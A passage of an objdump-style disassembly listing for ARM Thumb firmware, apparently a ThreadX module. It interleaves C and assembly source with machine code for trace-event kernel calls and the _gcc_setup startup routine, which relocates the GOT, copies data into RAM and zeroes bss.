 80217b4:	4b06      	ldr	r3, [pc, #24]	; (80217d0 <_tx_trace_isr_exit_insert+0x24>)
 80217b6:	f859 3003 	ldr.w	r3, [r9, r3]
 80217ba:	681c      	ldr	r4, [r3, #0]
 80217bc:	2300      	movs	r3, #0
 80217be:	2200      	movs	r2, #0
 80217c0:	6879      	ldr	r1, [r7, #4]
 80217c2:	2059      	movs	r0, #89	; 0x59
 80217c4:	47a0      	blx	r4
}
 80217c6:	bf00      	nop
 80217c8:	370c      	adds	r7, #12
 80217ca:	46bd      	mov	sp, r7
 80217cc:	bd90      	pop	{r4, r7, pc}
 80217ce:	bf00      	nop
 80217d0:	00000004 	.word	0x00000004

080217d4 <_tx_trace_user_event_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_user_event_insert(ULONG event_id, ULONG info_field_1, ULONG info_field_2, ULONG info_field_3, ULONG info_field_4)
{
 80217d4:	b590      	push	{r4, r7, lr}
 80217d6:	b089      	sub	sp, #36	; 0x24
 80217d8:	af00      	add	r7, sp, #0
 80217da:	60f8      	str	r0, [r7, #12]
 80217dc:	60b9      	str	r1, [r7, #8]
 80217de:	607a      	str	r2, [r7, #4]
 80217e0:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) info_field_2;
 80217e2:	687b      	ldr	r3, [r7, #4]
 80217e4:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) info_field_3;
 80217e6:	683b      	ldr	r3, [r7, #0]
 80217e8:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) info_field_4;
 80217ea:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80217ec:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_USER_EVENT_INSERT_CALL, (ALIGN_TYPE) event_id, (ALIGN_TYPE) info_field_1, (ALIGN_TYPE) extra_parameters);
 80217ee:	4b08      	ldr	r3, [pc, #32]	; (8021810 <_tx_trace_user_event_insert+0x3c>)
 80217f0:	f859 3003 	ldr.w	r3, [r9, r3]
 80217f4:	681c      	ldr	r4, [r3, #0]
 80217f6:	f107 0310 	add.w	r3, r7, #16
 80217fa:	68ba      	ldr	r2, [r7, #8]
 80217fc:	68f9      	ldr	r1, [r7, #12]
 80217fe:	205b      	movs	r0, #91	; 0x5b
 8021800:	47a0      	blx	r4
 8021802:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8021804:	69fb      	ldr	r3, [r7, #28]
}
 8021806:	4618      	mov	r0, r3
 8021808:	3724      	adds	r7, #36	; 0x24
 802180a:	46bd      	mov	sp, r7
 802180c:	bd90      	pop	{r4, r7, pc}
 802180e:	bf00      	nop
 8021810:	00000004 	.word	0x00000004
	...

08021820 <_gcc_setup>:

    .global _gcc_setup
    .thumb_func
_gcc_setup:

    STMDB   sp!, {r3, r4, r5, r6, r7, lr}             // Store other preserved registers
 8021820:	e92d 40f8 	stmdb	sp!, {r3, r4, r5, r6, r7, lr}

    ldr     r3, =__FLASH_segment_start__
 8021824:	4b2e      	ldr	r3, [pc, #184]	; (80218e0 <memory_set_done+0x2>)
    ldr     r4, =__RAM_segment_start__
 8021826:	4c2f      	ldr	r4, [pc, #188]	; (80218e4 <memory_set_done+0x6>)
    mov     r5,r0
 8021828:	4605      	mov	r5, r0

    /* Copy GOT table. */

    ldr     r0, =__got_load_start__
 802182a:	482f      	ldr	r0, [pc, #188]	; (80218e8 <memory_set_done+0xa>)
    sub     r0,r0,r3
 802182c:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 8021830:	4428      	add	r0, r5
    ldr     r1, =__new_got_start__
 8021832:	492e      	ldr	r1, [pc, #184]	; (80218ec <memory_set_done+0xe>)
    sub     r1,r1, r4
 8021834:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8021838:	4449      	add	r1, r9
    ldr     r2, =__new_got_end__
 802183a:	4a2d      	ldr	r2, [pc, #180]	; (80218f0 <memory_set_done+0x12>)
    sub     r2,r2,r4
 802183c:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 8021840:	444a      	add	r2, r9

08021842 <new_got_setup>:

new_got_setup:
    cmp     r1, r2          // See if there are more GOT entries
 8021842:	4291      	cmp	r1, r2
    beq     got_setup_done  // No, done with GOT setup
 8021844:	d011      	beq.n	802186a <got_setup_done>
    ldr     r6, [r0]        // Pickup current GOT entry
 8021846:	6806      	ldr	r6, [r0, #0]
    cmp     r6, #0          // Is it 0?
 8021848:	2e00      	cmp	r6, #0
    beq     address_built   // Yes, just skip the adjustment
 802184a:	d008      	beq.n	802185e <address_built>
    cmp     r6, r4          // Is it in the code or data area?
 802184c:	42a6      	cmp	r6, r4
    blt     flash_area      // If less than, it is a code address
 802184e:	db03      	blt.n	8021858 <flash_area>
    sub     r6, r6, r4      // Compute offset of data area
 8021850:	eba6 0604 	sub.w	r6, r6, r4
    add     r6, r6, r9      // Build address based on the loaded data address
 8021854:	444e      	add	r6, r9
    b       address_built   // Finished building address
 8021856:	e002      	b.n	802185e <address_built>

08021858 <flash_area>:
flash_area:
    sub     r6, r6, r3      // Compute offset of code area
 8021858:	eba6 0603 	sub.w	r6, r6, r3
    add     r6, r6, r5      // Build address based on the loaded code address
 802185c:	442e      	add	r6, r5

0802185e <address_built>:
address_built:
    str     r6, [r1]        // Store in new GOT table
 802185e:	600e      	str	r6, [r1, #0]
    add     r0, r0, #4      // Move to next entry
 8021860:	f100 0004 	add.w	r0, r0, #4
    add     r1, r1, #4      //
 8021864:	f101 0104 	add.w	r1, r1, #4
    b       new_got_setup   // Continue at the top of the loop
 8021868:	e7eb      	b.n	8021842 <new_got_setup>

0802186a <got_setup_done>:
got_setup_done:

    /* Copy initialised sections into RAM if required. */
  
    ldr     r0, =__data_load_start__
 802186a:	4822      	ldr	r0, [pc, #136]	; (80218f4 <memory_set_done+0x16>)
    sub     r0,r0,r3
 802186c:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 8021870:	4428      	add	r0, r5
    ldr     r1, =__data_start__
 8021872:	4921      	ldr	r1, [pc, #132]	; (80218f8 <memory_set_done+0x1a>)
    sub     r1,r1, r4
 8021874:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8021878:	4449      	add	r1, r9
    ldr     r2, =__data_end__
 802187a:	4a20      	ldr	r2, [pc, #128]	; (80218fc <memory_set_done+0x1e>)
    sub     r2,r2,r4
 802187c:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 8021880:	444a      	add	r2, r9
    bl      crt0_memory_copy
 8021882:	f000 f815 	bl	80218b0 <crt0_memory_copy>
  
    /* Zero bss. */
    
    ldr     r0, =__bss_start__
 8021886:	481e      	ldr	r0, [pc, #120]	; (8021900 <memory_set_done+0x22>)
    sub     r0,r0,r4
 8021888:	eba0 0004 	sub.w	r0, r0, r4
    add     r0,r0,r9
 802188c:	4448      	add	r0, r9
    ldr     r1, =__bss_end__
 802188e:	491d      	ldr	r1, [pc, #116]	; (8021904 <memory_set_done+0x26>)
    sub     r1,r1,r4
 8021890:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8021894:	4449      	add	r1, r9
    mov     r2, #0
 8021896:	f04f 0200 	mov.w	r2, #0
    bl      crt0_memory_set
 802189a:	f000 f81a 	bl	80218d2 <crt0_memory_set>

    
    LDMIA   sp!, {r3, r4, r5, r6, r7, lr}       // Store other preserved registers
 802189e:	e8bd 40f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, lr}
    bx      lr                                  // Return to caller
 80218a2:	4770      	bx	lr
 80218a4:	f3af 8000 	nop.w
 80218a8:	f3af 8000 	nop.w
 80218ac:	f3af 8000 	nop.w

080218b0 <crt0_memory_copy>:

  /* Startup helper functions. */

    .thumb_func
crt0_memory_copy:
    cmp     r0, r1
 80218b0:	4288      	cmp	r0, r1
    beq     memory_copy_done
 80218b2:	d00d      	beq.n	80218d0 <memory_copy_done>
    cmp     r2, r1
 80218b4:	428a      	cmp	r2, r1
    beq     memory_copy_done
 80218b6:	d00b      	beq.n	80218d0 <memory_copy_done>
    sub     r2, r2, r1
 80218b8:	eba2 0201 	sub.w	r2, r2, r1

080218bc <memory_copy_loop>:
memory_copy_loop:
    ldrb    r3, [r0]
 80218bc:	7803      	ldrb	r3, [r0, #0]
    add     r0, r0, #1
 80218be:	f100 0001 	add.w	r0, r0, #1
    strb    r3, [r1]
 80218c2:	700b      	strb	r3, [r1, #0]
    add     r1, r1, #1
 80218c4:	f101 0101 	add.w	r1, r1, #1
    sub     r2, r2, #1
 80218c8:	f1a2 0201 	sub.w	r2, r2, #1
    cmp     r2, #0
 80218cc:	2a00      	cmp	r2, #0
    bne     memory_copy_loop
 80218ce:	d1f5      	bne.n	80218bc <memory_copy_loop>

080218d0 <memory_copy_done>:
memory_copy_done:
    bx      lr
 80218d0:	4770      	bx	lr

080218d2 <crt0_memory_set>:

    .thumb_func
crt0_memory_set:
    cmp     r0, r1
 80218d2:	4288      	cmp	r0, r1
    beq     memory_set_done
 80218d4:	d003      	beq.n	80218de <memory_set_done>
    strb    r2, [r0]
 80218d6:	7002      	strb	r2, [r0, #0]
    add     r0, r0, #1
 80218d8:	f100 0001 	add.w	r0, r0, #1
    b       crt0_memory_set
 80218dc:	e7f9      	b.n	80218d2 <crt0_memory_set>

080218de <memory_set_done>:
memory_set_done:
    bx      lr
 80218de:	4770      	bx	lr
    ldr     r3, =__FLASH_segment_start__
 80218e0:	08020000 	.word	0x08020000
    ldr     r4, =__RAM_segment_start__
 80218e4:	2001c000 	.word	0x2001c000
    ldr     r0, =__got_load_start__
 80218e8:	08021908 	.word	0x08021908
    ldr     r1, =__new_got_start__
 80218ec:	2001c000 	.word	0x2001c000
    ldr     r2, =__new_got_end__
 80218f0:	2001c028 	.word	0x2001c028
    ldr     r0, =__data_load_start__
 80218f4:	08021974 	.word	0x08021974
    ldr     r1, =__data_start__
 80218f8:	2001c028 	.word	0x2001c028
    ldr     r2, =__data_end__
 80218fc:	2001c028 	.word	0x2001c028
    ldr     r0, =__bss_start__
 8021900:	2001c028 	.word	0x2001c028
    ldr     r1, =__bss_end__
 8021904:	2001c854 	.word	0x2001c854
